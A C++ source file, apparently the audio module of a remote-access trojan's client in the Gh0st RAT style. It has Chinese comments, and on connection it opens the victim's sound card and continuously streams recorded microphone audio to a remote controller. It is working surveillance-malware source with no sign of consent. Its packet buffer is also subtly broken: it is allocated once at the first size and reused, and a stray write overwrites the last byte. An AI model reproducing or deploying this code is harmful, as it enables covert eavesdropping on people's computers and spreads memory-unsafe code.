#include "AudioManager.h"
#include <Mmsystem.h>


//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CAudioManager::CAudioManager(CClientSocket* ClientObject) :CManager(ClientObject)
{
	
	m_hWorkThread = NULL;
	szPacket = NULL;
	m_bIsWorking = FALSE;
	m_AudioObject = NULL;

	if (Initialize() == FALSE)
	{
		ClientObject->Disconnect();
		return;
	}

	BYTE	bToken = TOKEN_AUDIO_START;
	Send((LPBYTE)&bToken, 1);

	WaitForDialogOpen();    //等待对话框打开


	m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread,
		(LPVOID)this, 0, NULL);
}


void  CAudioManager::OnReceive(LPBYTE szBuffer, UINT ulLength)
{
	switch (szBuffer[0])
	{
	case COMMAND_NEXT:
	{
		if (1 == ulLength)
			NotifyDialogIsOpen();
		break;
	}
	default:
	{
		m_AudioObject->PlayBuffer(szBuffer, ulLength);
		break;
	}
	}
}

DWORD CAudioManager::WorkThread(LPVOID lParam)   //发送声音到服务端
{
	CAudioManager* This = (CAudioManager*)lParam;

	while (This->m_bIsWorking)
	{
		if (!This->SendRecordBuffer())
			Sleep(20);
	}

	

	return 0;
}

BOOL CAudioManager::SendRecordBuffer()
{
	DWORD	dwBufferSize = 0;
	BOOL	dwReturn = 0;
	//这里得到 音频数据
	LPBYTE	szBuffer = m_AudioObject->GetRecordBuffer(&dwBufferSize);
	if (szBuffer == NULL)
		return 0;
	//分配缓冲区
	szPacket = szPacket ? szPacket : new BYTE[dwBufferSize + 1];
	//加入数据头
	szPacket[0] = TOKEN_AUDIO_DATA;     //向主控端发送该消息
	//复制缓冲区
	memcpy(szPacket + 1, szBuffer, dwBufferSize);
	szPacket[dwBufferSize] = 0;
	//发送出去
	if (dwBufferSize > 0)
	{
		dwReturn = Send((LPBYTE)szPacket, dwBufferSize + 1);
	}
	//delete[]szPacket;
	return dwReturn;
}

CAudioManager::~CAudioManager()
{
	m_bIsWorking = FALSE;                            //设定工作状态为假
	WaitForSingleObject(m_hWorkThread, INFINITE);    //等待 工作线程结束
	if (m_hWorkThread)
		CloseHandle(m_hWorkThread);

	if (m_AudioObject != NULL)
	{
		delete m_AudioObject;
		m_AudioObject = NULL;
	}
	if (szPacket)
	{
		delete[] szPacket;
		szPacket = NULL;
	}
	
}

//USB  
BOOL CAudioManager::Initialize()
{
	if (!waveInGetNumDevs())   //获取波形输入设备的数目  实际就是看看有没有声卡
		return FALSE;

	// SYS    SYS P	
	// 正在使用中.. 防止重复使用
	if (m_bIsWorking == TRUE)
	{
		return FALSE;
	}

	m_AudioObject = new CAudio;  //功能类

	m_bIsWorking = TRUE;
	return TRUE;
}